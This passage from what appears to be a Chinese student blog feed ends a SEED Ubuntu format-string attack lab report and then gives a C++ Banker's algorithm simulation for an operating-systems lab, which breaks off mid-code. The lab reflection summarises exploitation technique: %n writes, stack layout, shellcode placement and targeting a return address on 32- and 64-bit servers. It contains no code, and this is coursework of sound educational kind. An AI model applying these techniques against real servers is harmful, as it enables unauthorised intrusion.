src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204111437052.png" alt="image-20211204111437052"></p><h3 id="重新尝试攻击"><a href="#重新尝试攻击" class="headerlink" title="重新尝试攻击"></a>重新尝试攻击</h3><p>重新建立并开启docker，对32位服务器的target值进行攻击。发现target的值并没有改变，故攻击失败。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204111744294.png" alt="image-20211204111744294"></p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>​        本次实验任务逐步深入，完成好任务1~3，需要了解<code>va_list</code>指针在<code>printf()</code>下是如何移动的，并且理解<code>%s</code>、<code>%x</code>、<code>%n</code>等格式化字符的具体作用。任务4和任务5在前面的基础上，要求我们加深对栈的布局的理解和shellcode的使用，注意64位服务器的特殊性，用略有不同的方法对64位服务器程序进行攻击。这里我巧用python代码，避免了对精度修饰符的繁杂计算，每次根据服务器输出的不同，修改输入的起始地址和<code>myprintf</code>函数的返回地址所在地址即可完成攻击代码<code>exploit.c</code>。但是这个过程需要细心，我就因为两次低级失误：一次输错了shellcode的起始位置，另一次输错了计算精度修饰符的等式，而损失了不少时间。好在我最终有耐心完成这个实验，能较好地应用所学的知识和技能对格式化字符串漏洞进行攻击。</p>]]></content>
    
    
    <categories>
      
      <category>软件安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全实验</tag>
      
      <tag>计算机安全导论</tag>
      
      <tag>SeedUbuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>银行家算法的C++模拟</title>
    <link href="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/"/>
    <url>/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="实验五-银行家算法"><a href="#实验五-银行家算法" class="headerlink" title="实验五 银行家算法"></a>实验五 银行家算法</h1><h2 id="实验题目：银行家算法的模拟"><a href="#实验题目：银行家算法的模拟" class="headerlink" title="实验题目：银行家算法的模拟"></a>实验题目：银行家算法的模拟</h2><h3 id="提示1"><a href="#提示1" class="headerlink" title="提示1"></a>提示1</h3><ul><li>我们可以把操作系统看作是银行家，操作系统管理的资源相当于银行家管理的资金，进程向操作系统请求分配资源相当于用户向银行家贷款。操作系统按照银行家制定的规则为进程分配资源。</li><li>当进程在执行中申请资源时，先检查该进程已占用的资源数与本次申请的资源数之和是否超过了该进程对资源的最大需求量。若超过则拒绝分配资源，若没有超过，则再测试系统现存的资源能否满足该进程申请的资源量，若能满足则按当前的申请量分配资源，否则也要拒绝分配。</li></ul><h3 id="提示2"><a href="#提示2" class="headerlink" title="提示2"></a>提示2</h3><ul><li>安全状态：如果存在一个由系统中所有进程构成的安全序列<code>P1，…，Pn</code>，则系统处于安全状态。安全状态<br>一定是没有死锁发生。</li><li>不安全状态：不存在一个安全序列。不安全状态一定导致死锁。</li><li>安全序列：一个进程序列<code>&#123;P1，…，Pn&#125;</code>是安全的，如果对于每一个进程<code>Pi(1≤i≤n）</code>，它以后尚需要的资源量不超过系统当前剩余资源量与所有进程<code>Pj (j &lt; i</code>)当前占有资源量之和。</li></ul><h3 id="提示3"><a href="#提示3" class="headerlink" title="提示3"></a>提示3</h3><p>设<code>request</code>为进程<code>p[i]</code>的请求向量，如果<code>request[j]=K</code>，表示进程<code>p[i]</code>需要<code>K</code>个<code>R[j]</code>资源。当系统发出请求后，系统按下述步骤开始检查：<br>1）如果<code>request[j]&lt;=need[i][j]</code>,转向步骤2；否则报告出错，申请的资源已经大于它需要的最大值。<br>2）如果<code>request[j]&lt;=available[j]</code>，转向步骤3；否则报告出错，尚无足够的资源。<br>3）系统试探着把资源分配给<code>p[i]</code>，并修改下列数据结构中的值：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">available[j]=available[j]-request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]request[j]<br></code></pre></div></td></tr></table></figure><p>4）系统进行安全性算法，检查此次分配后，系统是否还处于安全状态，若安全，把资源分配给进程<code>p[i]</code>；否则，恢复原来的资源分配状态，让进程<code>p[i]</code>等待</p><h3 id="提示4"><a href="#提示4" class="headerlink" title="提示4"></a>提示4</h3><p>安全性算法：<br><code>int work[RESOURCE_NUMBER]；</code><br><code>bool finish[PROCESS_NUMBER]；</code></p><p>1) <code>Work=Available;</code><br>   <code>Finish=false;</code><br>2) 寻找满足条件的i：<br>   A、<code>Finish[i]=false;</code><br>   B、<code>Need[i]≤Work;</code><br>   如果不存在，则转4；<br>3) <code>Work:=Work+Allocation[i]；</code> <code>Finish[i]:=true；</code> 转2；<br>4) 若对所有i，<code>Finish[i]=true</code>，则系统处于安全状态，否则处于不安全状态。</p><h3 id="提示5-银行家算法的程序流程图"><a href="#提示5-银行家算法的程序流程图" class="headerlink" title="提示5(银行家算法的程序流程图)"></a>提示5(银行家算法的程序流程图)</h3><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128214359127.png" alt="image-20211128214359127"></p><h2 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h2><ul><li>数组（数据结构），保存进程、资源的各类信息以及安全序列</li></ul><figure class="highlight cc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cc">string resource[<span class="hljs-number">1000</span>];<span class="hljs-comment">//资源名</span><br><span class="hljs-type">int</span> available[<span class="hljs-number">1000</span>];<span class="hljs-comment">//各资源的刚开始的可用数量</span><br><span class="hljs-type">int</span> work[<span class="hljs-number">1000</span>];<span class="hljs-comment">//工作时各资源的可用数量</span><br><span class="hljs-type">int</span> Max[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>];<span class="hljs-comment">//进程的最大所需资源</span><br><span class="hljs-type">int</span> allocation[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>]; <span class="hljs-comment">//进程的已分配资源</span><br><span class="hljs-type">int</span> need[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>];<span class="hljs-comment">//进程当前需要的资源</span><br><span class="hljs-type">bool</span> Finish[<span class="hljs-number">1000</span>];<span class="hljs-comment">//进程是否完成</span><br><span class="hljs-type">int</span> request[<span class="hljs-number">1000</span>];<span class="hljs-comment">//请求资源</span><br><span class="hljs-type">int</span> safe[<span class="hljs-number">1000</span>];<span class="hljs-comment">//安全序列</span><br></code></pre></div></td></tr></table></figure><ul><li>整型变量</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">int</span> processNum = <span class="hljs-number">0</span>;<span class="hljs-comment">//进程数</span><br><span class="hljs-type">int</span> resourceNum = <span class="hljs-number">0</span>;<span class="hljs-comment">//资源类型数</span><br></code></pre></div></td></tr></table></figure><ul><li>函数说明：<ul><li><code>void Init()</code>：输入信息。</li><li><code>void display()</code>：显示当前所有进程分配状态。</li><li><code>bool isSafe()</code>：安全性检查算法，安全返回true，不安全返回false。</li></ul></li></ul><h2 id="源程序并附上注释"><a href="#源程序并附上注释" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iomanip&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> processNum = <span class="hljs-number">0</span>;<span class="hljs-comment">//进程数</span><br><span class="hljs-type">int</span> resourceNum = <span class="hljs-number">0</span>;<span class="hljs-comment">//资源类型数</span><br>string resource[<span class="hljs-number">1000</span>];<span class="hljs-comment">//资源名</span><br><span class="hljs-type">int</span> available[<span class="hljs-number">1000</span>];<span class="hljs-comment">//各资源的刚开始的可用数量</span><br><span class="hljs-type">int</span> work[<span class="hljs-number">1000</span>];<span class="hljs-comment">//工作时各资源的可用数量</span><br><span class="hljs-type">int</span> Max[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>];<span class="hljs-comment">//进程的最大所需资源</span><br><span class="hljs-type">int</span> allocation[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>]; <span class="hljs-comment">//进程的已分配资源</span><br><span class="hljs-type">int</span> need[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>];<span class="hljs-comment">//进程当前需要的资源</span><br><span class="hljs-type">bool</span> Finish[<span class="hljs-number">1000</span>];<span class="hljs-comment">//进程是否完成</span><br><span class="hljs-type">int</span> request[<span class="hljs-number">1000</span>];<span class="hljs-comment">//请求资源</span><br><span class="hljs-type">int</span> safe[<span class="hljs-number">1000</span>];<span class="hljs-comment">//安全序列</span><br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i, j;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量：&quot;</span>;<br>cin &gt;&gt; processNum;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入资源类型数量：&quot;</span>;<br>cin &gt;&gt; resourceNum;<br>cout &lt;&lt; <span class="hljs-string">&quot;请依次输入各资源的名称（不超过6个字符）和可用数目：&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;例：A 3 B 3 C 2&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; resourceNum; i++)<br>&#123;<br>cin &gt;&gt; resource[i] &gt;&gt; available[i];<br>&#125;<br><span class="hljs-comment">//最大需求的矩阵Max：</span><br>cout &lt;&lt; <span class="hljs-string">&quot;请输入最大需求的矩阵：&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;（进程顺序为从0到processNum，资源顺序为：&quot;</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; resource[j] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;）&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cin &gt;&gt; Max[i][j];<br>&#125;<br>&#125;<br><span class="hljs-comment">//分配矩阵allocation：</span><br>cout &lt;&lt; <span class="hljs-string">&quot;请输入当前分配各资源类型数量的矩阵&quot;</span>&lt;&lt;endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;（进程顺序为1-processNum，资源顺序为：&quot;</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; resource[j]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;）&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cin &gt;&gt; allocation[i][j];<br>&#125;<br>&#125;<br><span class="hljs-comment">//根据Max和allocation算出需求矩阵need：</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>need[i][j] = Max[i][j] - allocation[i][j];<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//显示当前所有进程分配状态</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showInfo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i, j;<br><span class="hljs-type">int</span> len = <span class="hljs-number">8</span> * resourceNum;<br>cout &lt;&lt; <span class="hljs-string">&quot;当前系统状态如下：&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//第1行：根据资源数的不同，居左输出</span><br>cout &lt;&lt; <span class="hljs-string">&quot;        &quot;</span>;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(len) &lt;&lt; <span class="hljs-string">&quot;Max&quot;</span>;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(len) &lt;&lt; <span class="hljs-string">&quot;Allocation&quot;</span>;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(len) &lt;&lt; <span class="hljs-string">&quot;Need&quot;</span>;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(len) &lt;&lt; <span class="hljs-string">&quot;Available&quot;</span>;<br>cout &lt;&lt; left &lt;&lt; endl;<br><span class="hljs-comment">//第2行：资源名</span><br>cout &lt;&lt; <span class="hljs-string">&quot;        &quot;</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; resource[j];<br>&#125;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-comment">//后面processNum行：各进程的资源情况</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;P&quot;</span> &lt;&lt; i&lt;&lt;<span class="hljs-string">&quot;      &quot;</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; Max[i][j] ;<br>&#125;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>)&lt;&lt; allocation[i][j];<br>&#125;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; need[i][j];<br>&#125;<br><span class="hljs-comment">//第三行输出多一项可用资源数</span><br><span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; available[j];<br>&#125;<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-comment">//安全性检查算法</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSafe</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i, j, k;<br><span class="hljs-type">int</span> round= <span class="hljs-number">0</span>; <span class="hljs-comment">//循环轮数</span><br><span class="hljs-type">int</span> FinishNum = <span class="hljs-number">0</span>; <span class="hljs-comment">//已完成的进程数</span><br><span class="hljs-comment">//work初始化</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; resourceNum; i++)<br>&#123;<br>work[i] = available[i];<br>&#125;<br><span class="hljs-comment">//Finish初始化</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br>Finish[i] = <span class="hljs-literal">false</span>;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (FinishNum &lt; processNum) <span class="hljs-comment">//有进程未完成</span><br>&#123;<br>j = <span class="hljs-number">0</span>; <span class="hljs-comment">//每次检查前，j需要初始化为0</span><br><span class="hljs-comment">//当前进程i是否满足Finish==false并且need&lt;work</span><br><span class="hljs-keyword">if</span> (Finish[i] == <span class="hljs-literal">false</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (need[i][j] &gt; work[j])<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//满足上面的条件则进行第3步：分配并释放资源，完成进程，记录于安全序列</span><br><span class="hljs-keyword">if</span> (j == resourceNum)<br>&#123;<br>Finish[i] = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; resourceNum; k++)<br>&#123;<br>work[k] += allocation[i][k];<br>&#125;<br><span class="hljs-comment">//输出当前可用资源数</span><br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;执行完成，释放资源。&quot;</span> &lt;&lt; <span class="hljs-string">&quot;当前可用资源数如下：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; resourceNum; k++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; resource[k];<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; resourceNum; k++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; work[k];<br>&#125;<br>cout &lt;&lt; endl;<br>safe[FinishNum] = i;<br>FinishNum++;<br>&#125;<br>i++; <span class="hljs-comment">//检查下一个进程</span><br><span class="hljs-keyword">if</span> (i &gt;= processNum) <span class="hljs-comment">//循环了一轮</span><br>&#123;<br>i %= processNum;<br><span class="hljs-keyword">if</span> (temp == FinishNum &amp;&amp; round &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//再次循环后进程完成数没有变化，则没有可以完成的进程了</span><br><span class="hljs-keyword">break</span>;<br>round++;<br>temp = FinishNum; <span class="hljs-comment">//记录本次循环的FinishNum</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (FinishNum == processNum)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;系统安全，安全序列为：&quot;</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;P&quot;</span> &lt;&lt; safe[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;剩余进程无法完成，系统不安全！&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//主函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i, j;<br><span class="hljs-built_in">Init</span>();<br><span class="hljs-built_in">showInfo</span>();<br><span class="hljs-comment">//初始化后检查安全性，若不安全则程序结束。</span><br>cout &lt;&lt; <span class="hljs-string">&quot;开始检查系统安全性：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isSafe</span>())<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;程序结束&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------------------------&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入要分配的进程：&quot;</span>;<br>cin &gt;&gt; i;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入要分配给进程P&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;的资源：&quot;</span> &lt;&lt; endl;<br>cout&lt;&lt; <span class="hljs-string">&quot;资源顺序为：&quot;</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cout &lt;&lt; resource[j] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cin &gt;&gt; request[j];<br>&#125;<br><span class="hljs-comment">//按步骤开始检查</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (request[j] &lt;= need[i][j])<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;错误！申请的资源已经大于它需要的最大值&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (j == resourceNum)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (request[j] &lt;= available[j])<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;错误！尚无足够的资源&quot;</span> &lt;&lt; endl;<br><span 